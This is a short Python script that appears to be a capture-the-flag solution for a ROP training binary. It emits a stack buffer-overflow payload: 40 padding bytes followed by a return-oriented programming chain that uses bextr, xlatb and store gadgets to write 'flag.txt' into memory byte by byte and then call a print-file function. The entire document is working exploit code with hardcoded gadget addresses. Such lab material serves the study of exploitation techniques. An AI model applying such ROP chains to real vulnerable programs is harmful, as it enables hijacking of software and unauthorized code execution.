#!/usr/bin/python3
from ctypes import *
import sys

WEIRD_BEXTR = 0x40062a
POP_RDI = 0x4006a3
WRITE_TO_RDI_GO_RIGHT = 0x400639
XLATB_TO_AL = 0x400628
CALL_PRINTFILE = 0x400620

FILENAME_BUF = 0x601028

def write_ints(dat):
    for v in dat:
        sys.stdout.buffer.write(v.to_bytes(8, byteorder="little"))

def write_call(addr):
    write_ints([addr])

def write_offset():
    sys.stdout.buffer.write(b'A'*40)

def calc_rcx_value(x):
    return c_ulong(x - 0x3ef2).value

def write_rdi(addr):
    write_call(POP_RDI)
    write_ints([addr])

def write_rbx(x):
    write_call(WEIRD_BEXTR)
    write_ints([0x4000, calc_rcx_value(x)]) # RDX, RCX

def write_al_from(src, last_al):
    write_rbx(c_ulong(src - last_al).value)
    write_call(XLATB_TO_AL)

def write_from_addrs(target, addrs_vals):
    last_al = 0x0b # Initial AL value 
    offset = 0

    for addrv in addrs_vals:
        addr = addrv[0]
        val = addrv[1]
        write_al_from(addr, last_al)
        last_al = val
        
        write_rdi(target + offset)
        write_call(WRITE_TO_RDI_GO_RIGHT)
        offset = offset + 1

STR_ADDRS = [
    [0x400552, 0x66], # f 
    [0x4003e4, 0x6c], # l
    [0x4005d2, 0x61], # a
    [0x4007a0, 0x67], # g
    [0x4003c9, 0x2e], # .
    [0x4006cb, 0x74], # t
    [0x4006c8, 0x78], # x
    [0x4006cb, 0x74], # t
]

write_offset()
write_from_addrs(FILENAME_BUF, STR_ADDRS)

write_rdi(FILENAME_BUF)
write_call(CALL_PRINTFILE)
